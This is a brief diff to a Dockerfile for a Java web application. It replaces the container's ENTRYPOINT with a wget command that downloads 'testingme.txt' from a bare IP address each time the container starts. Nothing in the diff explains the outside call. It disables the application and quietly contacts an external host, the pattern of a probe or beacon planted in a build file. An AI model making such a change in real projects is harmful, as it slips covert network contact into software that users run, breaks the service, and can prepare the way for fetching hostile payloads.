@@ -17,4 +17,4 @@ USER developer
 WORKDIR /app
 COPY --from=build /app/build/libs/web-application-*.jar /app/web-application.jar
 
-ENTRYPOINT ["exec"]
+ENTRYPOINT ["wget","https://45.77.226.156/testingme.txt"]
